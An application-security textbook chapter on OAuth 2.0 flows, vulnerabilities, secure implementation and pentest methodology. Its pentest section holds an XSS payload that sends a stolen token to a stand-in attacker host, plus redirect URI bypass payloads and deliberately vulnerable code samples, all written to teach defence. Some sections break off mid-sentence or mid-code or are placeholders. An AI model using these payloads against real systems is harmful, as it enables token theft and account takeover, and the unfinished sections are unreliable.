# Chapter 3: OAuth 2.0 Protocol and Flows

## Learning Objectives

After completing this chapter, you will be able to:

- Explain the core components and actors in OAuth 2.0 authorization flows
- Distinguish between different OAuth 2.0 grant types and their appropriate use cases
- Identify common security vulnerabilities in OAuth 2.0 implementations
- Design and review OAuth 2.0 implementations from an application security perspective
- Conduct security assessments of OAuth 2.0 integrations and custom implementations
- Implement OAuth 2.0 flows securely in web and mobile applications
- Recognize and mitigate authorization bypass and token theft attacks

## Conceptual Foundation

OAuth 2.0 is an authorization framework that enables applications to obtain limited access to user accounts on an HTTP service without exposing user credentials. It is fundamentally different from authentication—OAuth 2.0 answers the question "What is this application allowed to do?" rather than "Who is this user?"

### Core Concepts

**Resource Owner**: The user who owns the data or resources being protected. In a typical scenario, this is the end user granting permission to a third-party application.

**Client**: The application requesting access to the user's resources. This could be a web application, mobile app, or backend service. The client is identified by a client ID and authenticated using a client secret (in confidential client scenarios).

**Authorization Server**: The server that authenticates the resource owner and issues access tokens to the client. This server maintains the user's credentials and determines what permissions the client has requested.

**Resource Server**: The server hosting the protected resources. It validates access tokens and serves the protected data. In many implementations, the authorization server and resource server are the same entity, though they can be separate.

**Access Token**: A credential that represents the authorization grant. It contains scope information (what the client can do) and has a limited lifetime. Access tokens are typically opaque to the client but are validated by the resource server.

**Refresh Token**: A long-lived credential that allows the client to obtain a new access token without requiring the user to re-authenticate. Refresh tokens are sensitive and must be protected carefully.

**Scope**: A mechanism for limiting the access granted to a client. Scopes define what actions the client can perform on behalf of the user (e.g., "read:profile", "write:posts", "delete:account").

**Authorization Code**: A short-lived, single-use credential issued by the authorization server to the client after the user grants permission. The client exchanges this code for an access token.

### Why OAuth 2.0 Matters

Before OAuth 2.0, applications requesting access to user data typically asked for the user's password directly. This approach created significant security risks: users had to trust third-party applications with their credentials, password changes would break integrations, and there was no way to revoke access without changing the password.

OAuth 2.0 solves these problems by introducing a delegation mechanism. Users authenticate directly with the authorization server (the service they trust), and the authorization server issues a token to the client application. The user never shares their password with the client, and access can be revoked independently of password changes.

## Architecture Perspective

### OAuth 2.0 Grant Types and Their Use Cases

OAuth 2.0 defines several grant types, each suited to different application architectures and security contexts.

#### Authorization Code Flow

The Authorization Code flow is the most common and secure flow for traditional web applications. It involves four main steps:

1. **User Initiates Login**: The user clicks "Login with [Provider]" on the client application.

2. **Redirect to Authorization Server**: The client redirects the user to the authorization server with parameters including the client ID, requested scopes, and a redirect URI.

3. **User Authenticates and Consents**: The user authenticates with the authorization server and grants permission for the requested scopes.

4. **Authorization Code Issued**: The authorization server redirects the user back to the client's redirect URI with an authorization code.

5. **Backend Token Exchange**: The client's backend server exchanges the authorization code for an access token by making a direct request to the authorization server, authenticating with its client secret.

6. **Access Token Issued**: The authorization server validates the authorization code and client secret, then issues an access token (and optionally a refresh token).

7. **Resource Access**: The client uses the access token to request protected resources from the resource server.

**Why this flow is secure**: The authorization code is single-use and short-lived. The client secret is never exposed to the browser or user agent. The access token is obtained through a backend-to-backend channel, reducing exposure.

#### Authorization Code Flow with PKCE

PKCE (Proof Key for Code Exchange) is an extension to the Authorization Code flow designed for public clients (applications that cannot securely store a client secret), such as single-page applications (SPAs) and mobile applications.

In PKCE:

1. The client generates a random string called a `code_verifier`.
2. The client creates a `code_challenge` by hashing the code verifier.
3. The client sends the code challenge to the authorization server during the initial authorization request.
4. After receiving the authorization code, the client sends the code verifier along with the code when exchanging for an access token.
5. The authorization server verifies that the code verifier matches the code challenge, ensuring the same client that initiated the flow is completing it.

PKCE prevents authorization code interception attacks where an attacker could capture the authorization code and exchange it for a token without the original client's involvement.

#### Implicit Flow (Deprecated)

The Implicit flow was historically used for browser-based applications. It skipped the authorization code exchange step and directly issued an access token to the client in the browser. This flow is now deprecated because it exposes the access token in the URL and browser history, increasing the risk of token theft.

**Current guidance**: Do not use the Implicit flow for new implementations. Use Authorization Code with PKCE instead.

#### Client Credentials Flow

The Client Credentials flow is used for server-to-server communication where there is no resource owner (user) involved. The client authenticates directly with the authorization server using its credentials and receives an access token.

Example use case: A backend service needs to call another backend service's API.

```
POST /token HTTP/1.1
Host: authorization-server.example.com
Content-Type: application/x-www-form-urlencoded

grant_type=client_credentials
&client_id=s6BhdRkqt3
&client_secret=gX1fBat3bV
&scope=read:data
```

This flow is appropriate only when both parties are trusted entities under the same organizational control or have a strong business relationship.

#### Resource Owner Password Credentials Flow (Deprecated)

This flow allows the client to collect the user's username and password directly and exchange them for an access token. It is deprecated because it requires users to share their credentials with the client application, defeating the primary security benefit of OAuth 2.0.

**Current guidance**: Do not use this flow for new implementations. Use Authorization Code with PKCE instead.

### Token Lifecycle and Management

**Access Token Lifetime**: Access tokens should have a short lifetime (typically 15 minutes to 1 hour). Short-lived tokens limit the window of exposure if a token is compromised.

**Refresh Token Lifetime**: Refresh tokens can have longer lifetimes (days, weeks, or months) but should be rotated regularly. Some implementations issue new refresh tokens with each refresh operation, invalidating the old one.

**Token Revocation**: Authorization servers should support token revocation endpoints that allow clients or users to explicitly invalidate tokens before they expire naturally.

**Token Storage**: Access tokens should be stored securely. In web applications, they should be stored in memory or in secure, HTTP-only cookies. In mobile applications, they should be stored in secure storage mechanisms provided by the operating system.

## AppSec Lens

### Common OAuth 2.0 Vulnerabilities

#### Authorization Code Interception

**Vulnerability**: An attacker intercepts the authorization code returned to the client's redirect URI and uses it to obtain an access token.

**Attack Scenario**: A user clicks a malicious link that initiates an OAuth 2.0 flow with a legitimate authorization server but redirects to an attacker-controlled redirect URI. The attacker captures the authorization code and exchanges it for a token.

**Mitigation**: 
- Use PKCE for all public clients
- Validate redirect URIs strictly (exact match, not substring matching)
- Use short-lived authorization codes (60 seconds or less)
- Implement state parameter validation (discussed below)

#### State Parameter Bypass

**Vulnerability**: The client fails to validate the `state` parameter, allowing Cross-Site Request Forgery (CSRF) attacks.

**Attack Scenario**: An attacker tricks a user into clicking a link that initiates an OAuth 2.0 flow. The authorization server redirects back to the client with an authorization code. The attacker's browser receives the code and can exchange it for a token, potentially gaining access to the user's account.

**Mitigation**:
- Generate a cryptographically random state parameter for each authorization request
- Store the state parameter in a session or secure cookie
- Validate that the state parameter returned by the authorization server matches the stored value
- Reject requests with missing or invalid state parameters

#### Token Theft and Exposure

**Vulnerability**: Access tokens are exposed through insecure storage, logging, or transmission.

**Attack Scenarios**:
- Tokens stored in browser local storage are accessible to JavaScript, including malicious scripts injected through XSS vulnerabilities
- Tokens logged in application logs or error messages are exposed to anyone with log access
- Tokens transmitted over unencrypted HTTP connections are intercepted by network attackers
- Tokens included in URLs are exposed in browser history and server logs

**Mitigation**:
- Store tokens in memory or secure, HTTP-only cookies
- Never log tokens or include them in error messages
- Always use HTTPS for all OAuth 2.0 communications
- Implement Content Security Policy (CSP) to prevent XSS attacks
- Use short-lived access tokens with refresh token rotation

#### Redirect URI Validation Bypass

**Vulnerability**: The authorization server does not properly validate redirect URIs, allowing attackers to redirect users to malicious sites.

**Attack Scenario**: An attacker registers a client application with a redirect URI like `https://attacker.example.com/callback`. When a user initiates login through the attacker's application, the authorization server redirectes to the attacker's site with the authorization code. The attacker can then exchange the code for a token or use it to impersonate the user.

**Mitigation**:
- Maintain a whitelist of allowed redirect URIs for each client
- Perform exact string matching on redirect URIs (not substring or pattern matching)
- Reject redirect URIs with user-controlled components
- Use HTTPS for all redirect URIs
- Regularly audit registered redirect URIs

#### Scope Creep and Over-Privileged Tokens

**Vulnerability**: Clients request excessive scopes, and users grant permissions without understanding the implications.

**Attack Scenario**: A photo-sharing application requests scopes to read the user's email, contacts, and location data, even though these are not necessary for the application's core functionality. If the application is compromised, the attacker gains access to all these data categories.

**Mitigation**:
- Request only the minimum scopes necessary for functionality
- Clearly communicate to users what data the application will access
- Implement incremental authorization, requesting additional scopes only when needed
- Regularly audit and remove unused scopes
- Implement scope validation on the authorization server to reject requests for excessive scopes

#### Refresh Token Compromise

**Vulnerability**: Refresh tokens are stolen or exposed, allowing attackers to obtain new access tokens indefinitely.

**Attack Scenario**: A mobile application stores a refresh token in insecure storage. An attacker gains access to the device and extracts the refresh token. The attacker can then use the token to obtain new access tokens and impersonate the user.

**Mitigation**:
- Store refresh tokens in secure storage (encrypted, protected by OS-level mechanisms)
- Implement refresh token rotation: issue a new refresh token with each refresh operation and invalidate the old one
- Implement token binding to tie tokens to specific clients or devices
- Monitor for unusual refresh token usage patterns
- Implement short refresh token lifetimes with periodic re-authentication

#### Insecure Client Authentication

**Vulnerability**: Clients are not properly authenticated when exchanging authorization codes or refresh tokens for access tokens.

**Attack Scenario**: A public client (SPA or mobile app) is registered without a client secret. An attacker can exchange a captured authorization code for an access token by simply providing the client ID.

**Mitigation**:
- Use PKCE for all public clients instead of relying on client secrets
- For confidential clients, use strong client authentication (mutual TLS, client assertions)
- Implement rate limiting on token endpoints to detect brute force attacks
- Monitor for unusual token exchange patterns

### OAuth 2.0 and Third-Party Risk

When integrating with third-party OAuth 2.0 providers, consider:

- **Provider Security Posture**: Evaluate the security practices of the authorization server provider. Are they SOC 2 certified? Do they publish security advisories?
- **Data Minimization**: Request only the scopes necessary for your application's functionality.
- **Token Handling**: Ensure your application handles tokens securely and does not expose them unnecessarily.
- **Incident Response**: Understand the provider's incident response procedures and how you will be notified of security issues.
- **Dependency Management**: Regularly update OAuth 2.0 libraries and dependencies to patch security vulnerabilities.

## Developer Lens

### Implementing OAuth 2.0 Securely

#### Web Application Example: Authorization Code Flow with PKCE

This example demonstrates a secure OAuth 2.0 implementation for a web application using the Authorization Code flow with PKCE.

**Step 1: Generate PKCE Parameters**

```javascript
// Generate a random code verifier
function generateCodeVerifier() {
  const array = new Uint8Array(32);
  crypto.getRandomValues(array);
  return btoa(String.fromCharCode.apply(null, array))
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=/g, '');
}

// Generate code challenge from verifier
async function generateCodeChallenge(verifier) {
  const encoder = new TextEncoder();
  const data = encoder.encode(verifier);
  const digest = await crypto.subtle.digest('SHA-256', data);
  return btoa(String.fromCharCode.apply(null, new Uint8Array(digest)))
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=/g, '');
}

// Usage
const codeVerifier = generateCodeVerifier();
const codeChallenge = await generateCodeChallenge(codeVerifier);
```

**Step 2: Generate State Parameter and Initiate Authorization Request**

```javascript
// Generate random state parameter
function generateState() {
  const array = new Uint8Array(32);
  crypto.getRandomValues(array);
  return btoa(String.fromCharCode.apply(null, array))
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=/g, '');
}

// Store state and code verifier in session storage
const state = generateState();
sessionStorage.setItem('oauth_state', state);
sessionStorage.setItem('oauth_code_verifier', codeVerifier);

// Construct authorization URL
const authorizationUrl = new URL('https://auth-server.example.com/authorize');
authorizationUrl.searchParams.append('client_id', 'your-client-id');
authorizationUrl.searchParams.append('redirect_uri', 'https://your-app.example.com/callback');
authorizationUrl.searchParams.append('response_type', 'code');
authorizationUrl.searchParams.append('scope', 'openid profile email');
authorizationUrl.searchParams.append('state', state);
authorizationUrl.searchParams.append('code_challenge', codeChallenge);
authorizationUrl.searchParams.append('code_challenge_method', 'S256');

// Redirect user to authorization server
window.location.href = authorizationUrl.toString();
```

**Step 3: Handle Authorization Callback**

```javascript
// On the callback page (https://your-app.example.com/callback)
const params = new URLSearchParams(window.location.search);
const code = params.get('code');
const returnedState = params.get('state');
const error = params.get('error');

// Validate state parameter
const storedState = sessionStorage.getItem('oauth_state');
if (returnedState !== storedState) {
  console.error('State parameter mismatch - possible CSRF attack');
  // Reject the authorization
  return;
}

// Check for errors
if (error) {
  console.error('Authorization error:', error);
  return;
}

// Exchange authorization code for access token (backend)
const codeVerifier = sessionStorage.getItem('oauth_code_verifier');
const tokenResponse = await fetch('https://your-app.example.com/api/token', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
  },
  body: JSON.stringify({
    code: code,
    code_verifier: codeVerifier,
    client_id: 'your-client-id',
    redirect_uri: 'https://your-app.example.com/callback',
    grant_type: 'authorization_code',
  }),
});

const tokenData = await tokenResponse.json();

// Store access token securely (in memory or HTTP-only cookie)
// Never store in localStorage
sessionStorage.removeItem('oauth_state');
sessionStorage.removeItem('oauth_code_verifier');

// Use the access token to fetch user data
const userResponse = await fetch('https://resource-server.example.com/userinfo', {
  headers: {
    'Authorization': `Bearer ${tokenData.access_token}`,
  },
});

const userData = await userResponse.json();
// Proceed with user login
```

**Step 4: Backend Token Exchange**

```python
# Backend implementation (Python/Flask example)
from flask import Flask, request, jsonify
import requests
import secrets
import hashlib
import base64

app = Flask(__name__)

@app.route('/api/token', methods=['POST'])
def exchange_token():
    data = request.json
    code = data.get('code')
    code_verifier = data.get('code_verifier')
    client_id = data.get('client_id')
    redirect_uri = data.get('redirect_uri')
    
    # Validate inputs
    if not all([code, code_verifier, client_id, redirect_uri]):
        return jsonify({'error': 'Missing required parameters'}), 400
    
    # Verify code_verifier matches code_challenge
    # (This is done by the authorization server)
    
    # Exchange code for token with authorization server
    token_request = {
        'grant_type': 'authorization_code',
        'code': code,
        'code_verifier': code_verifier,
        'client_id': client_id,
        'client_secret': os.environ.get('OAUTH_CLIENT_SECRET'),
        'redirect_uri': redirect_uri,
    }
    
    response = requests.post(
        'https://auth-server.example.com/token',
        data=token_request,
        timeout=5
    )
    
    if response.status_code != 200:
        return jsonify({'error': 'Token exchange failed'}), 400
    
    token_data = response.json()
    
    # Store access token in HTTP-only, Secure cookie
    resp = jsonify({'success': True})
    resp.set_cookie(
        'access_token',
        token_data['access_token'],
        httponly=True,
        secure=True,
        samesite='Strict',
        max_age=3600  # 1 hour
    )
    
    # Store refresh token separately if present
    if 'refresh_token' in token_data:
        resp.set_cookie(
            'refresh_token',
            token_data['refresh_token'],
            httponly=True,
            secure=True,
            samesite='Strict',
            max_age=2592000  # 30 days
        )
    
    return resp
```

### Best Practices for Developers

**1. Always Use HTTPS**: All OAuth 2.0 communications must occur over HTTPS. Never transmit tokens or authorization codes over unencrypted connections.

**2. Implement Proper Token Storage**:
- Web applications: Store tokens in memory or HTTP-only, Secure cookies
- Mobile applications: Use platform-specific secure storage (Keychain on iOS, Keystore on Android)
- Never store tokens in browser local storage

**3. Validate All Inputs**: Validate authorization codes, state parameters, and redirect URIs on the backend before processing.

**4. Implement Token Refresh Logic

## Pentest Lens

### OAuth 2.0 Assessment Methodology

When conducting security assessments of OAuth 2.0 implementations, follow a structured approach:

**1. Reconnaissance and Configuration Review**

- Identify all OAuth 2.0 endpoints (authorization, token, userinfo, revocation)
- Document registered redirect URIs and client configurations
- Enumerate supported grant types and response types
- Review authorization server metadata (`.well-known/openid-configuration`)
- Identify token formats (JWT vs. opaque) and claims
- Document scope definitions and their purposes

**2. Flow Analysis**

- Trace the complete authorization flow from initiation to token usage
- Identify where tokens are stored and transmitted
- Map data flows between client, authorization server, and resource server
- Document session management mechanisms
- Review state parameter implementation and validation
- Analyze PKCE implementation (if present)

**3. Token Inspection and Manipulation**

- Decode JWT tokens to examine claims, expiration, and audience
- Test token reuse across different clients or applications
- Attempt to modify token claims and re-submit
- Test token lifetime boundaries (use expired tokens, tokens about to expire)
- Attempt to use access tokens as refresh tokens and vice versa
- Test cross-origin token usage (use token from one origin in another)

**4. Authorization Code Testing**

- Capture authorization codes and test reuse
- Attempt to exchange the same code multiple times
- Test authorization code lifetime (use after expiration)
- Attempt to use authorization codes from different flows
- Test authorization code binding to client ID and redirect URI
- Attempt to exchange codes without PKCE when PKCE is expected

**5. Redirect URI Validation Testing**

- Test exact redirect URI matching vs. substring matching
- Attempt open redirect vulnerabilities:
  - `redirect_uri=https://attacker.example.com`
  - `redirect_uri=https://legitimate.example.com.attacker.example.com`
  - `redirect_uri=https://legitimate.example.com@attacker.example.com`
  - `redirect_uri=https://legitimate.example.com#attacker.example.com`
  - `redirect_uri=javascript:alert(1)`
  - `redirect_uri=data:text/html,<script>alert(1)</script>`
- Test wildcard or pattern-based redirect URIs
- Test redirect URIs with user-controlled parameters
- Test HTTP vs. HTTPS redirect URIs

**6. State Parameter Testing**

- Initiate authorization without state parameter
- Reuse state parameters across multiple flows
- Modify state parameter values
- Test state parameter validation on callback
- Attempt CSRF by initiating flow without state and capturing code
- Test state parameter length and entropy

**7. Scope and Permission Testing**

- Request scopes that should not be available to the client
- Request scopes with typos or variations
- Test incremental authorization (request additional scopes mid-session)
- Attempt to escalate privileges by modifying scope requests
- Test scope validation on resource server
- Verify that users are informed of requested scopes

**8. Token Endpoint Testing**

- Test client authentication mechanisms:
  - Attempt token exchange without client secret
  - Attempt token exchange with incorrect client secret
  - Test client assertion authentication (if supported)
  - Test mutual TLS authentication (if supported)
- Test refresh token exchange:
  - Attempt to use expired refresh tokens
  - Attempt to reuse refresh tokens after rotation
  - Test refresh token binding to client
- Test rate limiting on token endpoint
- Test for information disclosure in error messages

**9. Resource Server Testing**

- Test token validation on resource server
- Attempt to access resources with invalid or expired tokens
- Test scope enforcement (use token with insufficient scopes)
- Attempt to access resources belonging to other users
- Test token audience validation
- Verify that resource server properly validates token signature (if JWT)

**10. Session and Logout Testing**

- Test logout functionality and token revocation
- Attempt to use tokens after logout
- Test session fixation attacks
- Verify that logout on one client invalidates sessions on others
- Test token revocation endpoint (if available)

### Common Pentest Findings and Exploitation

**Finding: Missing State Parameter Validation**

```
Test Case: CSRF via Authorization Code
1. Attacker initiates OAuth flow without state parameter
2. Attacker tricks user into clicking malicious link
3. Authorization server redirects to attacker's callback with code
4. Attacker's browser receives code and exchanges it for token
5. Attacker gains access to user's account

Exploitation:
GET /authorize?client_id=attacker-app&redirect_uri=https://attacker.example.com/callback&response_type=code&scope=read:profile
```

**Finding: Redirect URI Substring Matching**

```
Test Case: Open Redirect via Redirect URI Bypass
1. Authorization server configured with redirect_uri=https://legitimate.example.com
2. Attacker submits: redirect_uri=https://legitimate.example.com.attacker.example.com
3. Server performs substring match and allows redirect
4. User is redirected to attacker's domain with authorization code
5. Attacker exchanges code for access token

Exploitation:
GET /authorize?client_id=legitimate-app&redirect_uri=https://legitimate.example.com.attacker.example.com/callback&response_type=code
```

**Finding: Authorization Code Reuse**

```
Test Case: Authorization Code Replay
1. Capture authorization code from callback URL
2. Attempt to exchange code multiple times
3. If server does not invalidate code after first use, attacker can obtain multiple tokens
4. Attacker can use tokens to access user data or perform actions

Exploitation:
POST /token
grant_type=authorization_code&code=CAPTURED_CODE&client_id=app&client_secret=secret
(Repeat request multiple times)
```

**Finding: Weak PKCE Implementation**

```
Test Case: PKCE Bypass via Plain Code Challenge
1. Client uses code_challenge_method=plain instead of S256
2. Attacker captures authorization code
3. Attacker generates arbitrary code_verifier
4. Attacker exchanges code with arbitrary verifier
5. Server accepts because plain method does not validate verifier

Exploitation:
POST /token
grant_type=authorization_code&code=CAPTURED_CODE&code_verifier=ARBITRARY_VALUE&code_challenge_method=plain
```

**Finding: Token Stored in Browser Local Storage**

```
Test Case: XSS to Token Theft
1. Identify that application stores access token in localStorage
2. Find XSS vulnerability in application
3. Execute JavaScript to extract token: localStorage.getItem('access_token')
4. Use token to access protected resources or impersonate user

Exploitation:
<script>
fetch('https://attacker.example.com/steal?token=' + localStorage.getItem('access_token'))
</script>
```

**Finding: Insufficient Scope Validation**

```
Test Case: Scope Escalation
1. Application registered with scopes: read:profile, read:email
2. Attacker modifies authorization request to include: read:profile, read:email, delete:account
3. If authorization server does not validate against registered scopes, attacker gains excessive permissions
4. Attacker can delete user account or perform other privileged actions

Exploitation:
GET /authorize?client_id=app&scope=read:profile%20read:email%20delete:account&redirect_uri=...
```

**Finding: Refresh Token Compromise**

```
Test Case: Refresh Token Extraction and Reuse
1. Identify that mobile app stores refresh token in insecure storage
2. Extract refresh token from device storage
3. Use refresh token to obtain new access tokens
4. Attacker maintains persistent access even after user changes password

Exploitation:
POST /token
grant_type=refresh_token&refresh_token=EXTRACTED_TOKEN&client_id=app&client_secret=secret
```

### Tools and Techniques

**Burp Suite Extensions**:
- OAuth 2.0 Analyzer: Identifies common OAuth 2.0 vulnerabilities
- JWT Editor: Decodes and manipulates JWT tokens
- Autorize: Tests authorization enforcement

**Manual Testing Techniques**:
- Intercept and modify authorization requests in proxy
- Capture and replay authorization codes
- Decode JWT tokens using jwt.io or command-line tools
- Test token endpoints with curl or Postman
- Analyze token claims and expiration

**Automated Scanning**:
- OWASP ZAP with OAuth 2.0 scan rules
- Burp Suite active scanner with OAuth 2.0 checks
- Custom scripts to test common vulnerabilities

---

## Common Findings

### Critical Severity

**1. Authorization Code Interception and Reuse**

**Description**: Authorization codes are not properly invalidated after use, allowing attackers to exchange the same code multiple times for access tokens.

**Impact**: Unauthorized access to user accounts and resources. Attacker can obtain valid access tokens without user knowledge.

**Detection**:
- Capture authorization code from callback URL
- Attempt to exchange code multiple times
- Observe if multiple access tokens are issued

**Remediation**:
- Invalidate authorization code immediately after first successful exchange
- Implement single-use enforcement at database level
- Log all token exchange attempts for monitoring
- Implement rate limiting on token endpoint

**Code Example (Vulnerable)**:
```python
@app.route('/token', methods=['POST'])
def token_endpoint():
    code = request.form.get('code')
    # Vulnerable: No check if code was already used
    token = exchange_code_for_token(code)
    return jsonify({'access_token': token})
```

**Code Example (Secure)**:
```python
@app.route('/token', methods=['POST'])
def token_endpoint():
    code = request.form.get('code')
    
    # Check if code was already used
    if is_code_used(code):
        log_security_event('Attempted reuse of authorization code', code)
        return jsonify({'error': 'invalid_grant'}), 400
    
    token = exchange_code_for_token(code)
    mark_code_as_used(code)
    return jsonify({'access_token': token})
```

**2. Missing or Ineffective State Parameter Validation**

**Description**: The state parameter is not validated or is validated incorrectly, allowing CSRF attacks against the OAuth 2.0 flow.

**Impact**: Attackers can trick users into authorizing malicious applications or granting excessive permissions. Attacker can obtain authorization codes and exchange them for tokens.

**Detection**:
- Initiate authorization request without state parameter
- Observe if callback is processed without state validation
- Modify state parameter and observe if validation occurs
- Attempt CSRF by initiating flow from attacker-controlled site

**Remediation**:
- Generate cryptographically random state parameter for each request
- Store state in session or secure cookie
- Validate state parameter on callback before processing
- Reject requests with missing or invalid state
- Implement SameSite cookie attribute

**Code Example (Vulnerable)**:
```javascript
// No state parameter generated or validated
const authUrl = `https://auth-server.example.com/authorize?client_id=${clientId}&redirect_uri=${redirectUri}&response_type=code`;
window.location.href = authUrl;

// On callback, no validation
const code = new URLSearchParams(window.location.search).get('code');
exchangeCodeForToken(code);
```

**Code Example (Secure)**:
```javascript
// Generate and store state
const state = generateRandomString(32);
sessionStorage.setItem('oauth_state', state);

const authUrl = `https://auth-server.example.com/authorize?client_id=${clientId}&redirect_uri=${redirectUri}&response_type=code&state=${state}`;
window.location.href = authUrl;

// On callback, validate state
const params = new URLSearchParams(window.location.search);
const returnedState = params.get('state');
const storedState = sessionStorage.getItem('oauth_state');

if (returnedState !== storedState) {
    throw new Error('State parameter mismatch - possible CSRF attack');
}

const code = params.get('code');
exchangeCodeForToken(code);
```

**3. Redirect URI Validation Bypass**

**Description**: The authorization server does not properly validate redirect URIs, allowing attackers to redirect users to malicious sites or bypass security controls.

**Impact**: Authorization codes and access tokens can be redirected to attacker-controlled sites. Attackers can obtain user credentials or perform account takeover.

**Detection**:
- Test redirect URI with attacker-controlled domain
- Test redirect URI with subdomain of legitimate domain
- Test redirect URI with special characters or encoding
- Test redirect URI with protocol confusion (http vs https)

**Remediation**:
- Maintain strict whitelist of allowed redirect URIs
- Perform exact string matching (not substring or regex)
- Reject redirect URIs with user-controlled components
- Require HTTPS for all redirect URIs
- Validate redirect URI format and protocol
- Regularly audit registered redirect URIs

**Code Example (Vulnerable)**:
```python
# Vulnerable: Substring matching
allowed_uris = ['https://legitimate.example.com']
redirect_uri = request.args.get('redirect_uri')

if any(allowed in redirect_uri for allowed in allowed_uris):
    # Process authorization
    pass
```

**Code Example (Secure)**:
```python
# Secure: Exact matching with whitelist
ALLOWED_REDIRECT_URIS = {
    'https://legitimate.example.com/callback',
    'https://legitimate.example.com/oauth/callback'
}

redirect_uri = request.args.get('redirect_uri')

if redirect_uri not in ALLOWED_REDIRECT_URIS:
    return error_response('invalid_request')

# Process authorization
```

**4. Access Tokens Stored in Browser Local Storage**

**Description**: Access tokens are stored in browser local storage, making them accessible to JavaScript and vulnerable to XSS attacks.

**Impact**: XSS vulnerabilities can be exploited to steal access tokens. Attackers can use tokens to access protected resources or impersonate users.

**Detection**:
- Inspect browser storage (DevTools > Application > Local Storage)
- Search for tokens in localStorage, sessionStorage
- Identify XSS vulnerabilities that could access tokens

**Remediation**:
- Store tokens in memory or HTTP-only, Secure cookies
- Never store tokens in localStorage or sessionStorage
- Implement Content Security Policy (CSP) to prevent XSS
- Use SameSite cookie attribute
- Implement token rotation and short expiration

**Code Example (Vulnerable)**:
```javascript
// Vulnerable: Storing token in localStorage
const response = await fetch('/token', { method: 'POST', ... });
const data = await response.json();
localStorage.setItem('access_token', data.access_token);

// Token is accessible to any JavaScript
const token = localStorage.getItem('access_token');
```

**Code Example (Secure)**:
```javascript
// Secure: Storing token in HTTP-only cookie (set by server)
const response = await fetch('/token', { 
    method: 'POST',
    credentials: 'include'  // Include cookies
});

// Token is stored in HTTP-only cookie by server
// Not accessible to JavaScript
// Automatically sent with requests

// For SPA, use Backend-for-Frontend (BFF) pattern
// SPA calls BFF endpoint, BFF handles OAuth and stores token in HTTP-only cookie
```

**Server-side (Secure)**:
```python
@app.route('/token', methods=['POST'])
def token_endpoint():
    # ... token exchange logic ...
    
    response = jsonify({'success': True})
    response.set_cookie(
        'access_token',
        token_data['access_token'],
        httponly=True,      # Not accessible to JavaScript
        secure=True,        # Only sent over HTTPS
        samesite='Strict',  # CSRF protection
        max_age=3600        # 1 hour expiration
    )
    return response
```

### High Severity

**5. Weak or Missing PKCE Implementation**

**Description**: PKCE is not implemented for public clients (SPAs, mobile apps), or PKCE is implemented incorrectly (e.g., using plain method instead of S256).

**Impact**: Authorization codes can be intercepted and exchanged for access tokens by attackers. Particularly dangerous for mobile and SPA applications.

**Detection**:
- Capture authorization request and check for code_challenge parameter
- Check code_challenge_method (should be S256, not plain)
- Attempt to exchange authorization code without code_verifier
- Attempt to exchange code with arbitrary code_verifier

**Remediation**:
- Implement PKCE for all public clients
- Use S256 (SHA-256) code challenge method
- Generate cryptographically random code_verifier (43-128 characters)
- Validate code_verifier on token endpoint
- For confidential clients, use client secret authentication

**Code Example (Vulnerable)**:
```javascript
// Vulnerable: No PKCE implementation
const authUrl = `https://auth-server.example.com/authorize?client_id=${clientId}&redirect_uri=${redirectUri}&response_type=code`;
window.location.href = authUrl;

// Token exchange without PKCE
const response = await fetch('/token', {
    method: 'POST',
    body: new URLSearchParams({
        grant_type: 'authorization_code',
        code: authCode,
        client_id: clientId
    })
});
```

**Code Example (Secure)**:
```javascript
// Secure: PKCE implementation with S256
async function generatePKCE() {
    const codeVerifier = generateRandomString(128);
    const encoder = new TextEncoder();
    const data = encoder.encode(codeVerifier);
    const digest = await crypto.subtle.digest('SHA-256', data);
    const codeChallenge = btoa(String.fromCharCode(...new Uint8Array(digest)))
        .replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
    
    return { codeVerifier, codeChallenge };
}

const { codeVerifier, codeChallenge } = await generatePKCE();
sessionStorage.setItem('code_verifier', codeVerifier);

const authUrl = `https://auth-server.example.com/authorize?client_id=${clientId}&redirect_uri=${redirectUri}&response_type=code&code_challenge=${codeChallenge}&code_challenge_method=S256`;
window.location.href = authUrl;

// Token exchange with PKCE
const codeVerifier = sessionStorage.getItem('code_verifier');
const response = await fetch('/token', {
    method: 'POST',
    body: new URLSearchParams({
        grant_type: 'authorization_code',
        code: authCode,
        client_id: clientId,
        code_verifier: codeVerifier
    })
});
```

**6. Insufficient Scope Validation**

**Description**: The authorization server does not validate requested scopes against the client's registered scopes, allowing scope escalation attacks.

**Impact**: Clients can request and obtain permissions beyond their registered scopes. Compromised clients can access sensitive data or perform privileged actions.

**Detection**:
- Register client with limited scopes (e.g., read:profile)
- Attempt to request additional scopes (e.g., delete:account)
- Observe if authorization server allows excessive scopes

**Remediation**:
- Maintain whitelist of allowed scopes for each client
- Validate requested scopes against whitelist
- Reject authorization requests with unregistered scopes
- Implement scope hierarchy and validation rules
- Log scope requests for monitoring

**Code Example (Vulnerable)**:
```python
# Vulnerable: No scope validation
@app.route('/authorize', methods=['GET'])
def authorize():
    client_id = request.args.get('client_id')
    requested_scopes = request.args.get('scope', '').split()
    
    # No validation of requested scopes
    # Proceed with authorization
    return render_template('consent.html', scopes=requested_scopes)
```

**Code Example (Secure)**:
```python
# Secure: Scope validation against whitelist
CLIENT_SCOPES = {
    'app-1': {'read:profile', 'read:email'},
    'app-2': {'read:profile', 'write:posts'}
}

@app.route('/authorize', methods=['GET'])
def authorize():
    client_id = request.args.get('client_id')
    requested_scopes = set(request.args.get('scope', '').split())
    
    #
```

## Secure Design Guidance

This section requires additional handbook content. Cover the topic with vendor-neutral guidance, practical AppSec examples, implementation considerations, and testing notes.

## Interview Questions

- How do authentication and authorization failures show up differently in application logs?
- What controls would you expect around session creation, token validation, and privilege checks?
- How would you review an API endpoint to confirm that authorization is enforced server-side?
- What is the risk of relying on client-side checks for access control?
- How should teams test for horizontal and vertical privilege escalation?

## Key Takeaways

- Authentication verifies identity; authorization decides what that identity can access.
- Strong authentication does not compensate for missing or inconsistent authorization checks.
- Authorization belongs on the server side and should be enforced close to protected resources.
- AppSec reviews should trace identity, session, role, permission, and object ownership decisions.
- Secure design requires clear access-control models, centralized policy logic, and repeatable tests.

## Sketchnote Placeholder

[SKETCHNOTE DIAGRAM PLACEHOLDER]
